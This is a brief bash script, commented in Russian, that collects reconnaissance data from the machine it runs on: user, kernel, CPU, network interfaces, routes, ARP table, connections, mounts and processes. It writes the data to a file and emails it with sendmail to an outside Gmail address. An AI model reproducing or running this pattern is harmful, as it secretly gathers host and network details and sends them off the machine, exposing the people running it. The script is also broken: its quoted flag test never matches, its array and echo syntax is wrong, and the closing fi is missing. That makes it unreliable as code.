#!/bin/bash

locale=()
locale+=$(pwd)
locale+=$(whoami)
locale+=$(uname -a)
locale+=$(cat /proc/cpuinfo)
locale+=$(ifconfig)
locale+=$(route)
locale+=$(arp -a)
locale+=$(netstat -a)
locale+=$(mount)
locale+=$(ps -e)

flag=true
if [ '$flag' = true ] ; then
    echo {$locale[@]} > file_network.txt # записываем массив в file_network.txt 
    sendmail < file_network.txt mail@gmail.com # отправляем file_network.txt с помощью sendmail 
elif [ '$flag' = false ] ; then
    echo 'file_network.txt not sent' 
